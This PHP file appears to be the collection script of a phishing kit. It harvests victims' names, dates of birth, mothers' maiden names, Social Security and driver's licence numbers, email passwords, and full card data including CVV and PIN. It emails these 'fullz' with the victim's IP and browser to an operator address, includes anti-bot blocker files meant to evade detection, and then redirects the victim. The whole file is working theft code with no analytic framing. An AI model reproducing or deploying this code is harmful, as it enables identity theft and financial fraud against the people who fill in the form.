<?php
session_start();
	include "email.php";
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
					include "blocker.php";

$FN = $_POST['FN'];

$D1 = $_POST['D1'];
$D2 = $_POST['D2'];
$D3 = $_POST['D3'];

$MN = $_POST['MN'];
$SN = $_POST['SN'];
$DL = $_POST['DL'];

$EA = $_POST['EA'];
$EP = $_POST['EP'];

$NC = $_POST['NC'];
$CN = $_POST['CN'];
$E1 = $_POST['E1'];
$E2 = $_POST['E2'];
$CV = $_POST['CV'];
$AP = $_POST['AP'];

$_SESSION['FN'] = $FN;
$_SESSION['D1'] = $D1;
$_SESSION['D2'] = $D2;
$_SESSION['D3'] = $D3;

$_SESSION['MN'] = $_POST['MN'];
$_SESSION['SN'] = $_POST['SN'];
$_SESSION['DL'] = $_POST['DL'];

$_SESSION['EA'] = $_POST['EA'];
$_SESSION['EP'] = $_POST['EP'];

$_SESSION['NC'] = $_POST['NC'];
$_SESSION['CN'] = $_POST['CN'];
$_SESSION['E1'] = $_POST['E1'];
$_SESSION['E2'] = $_POST['E2'];
$_SESSION['CV'] = $_POST['CV'];
$_SESSION['AP'] = $_POST['AP'];

if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
FN: $FN
DOB: $D1-$D2-$D3

MMN : $MN
SSN: $SN
DL: $DL
-----------
EM: $EA
PAS: $EP
-----------
NAME$NC
CC:$CN
EXP:$E1/$E2
CVV:$CV
PIN:$AP
------------------------
Ip: $ip,$browser
Host: $hostname
=====================";
 if ($CN != "" && strlen($CN)<20 && strlen($FN)<20 ) {
  $subj = "#MANU fullz# $user $ip";



mail($emailusr,$subj,$data);
  
}






?>
<script>
    window.top.location.href = "./load/finalmsg.htm";

</script>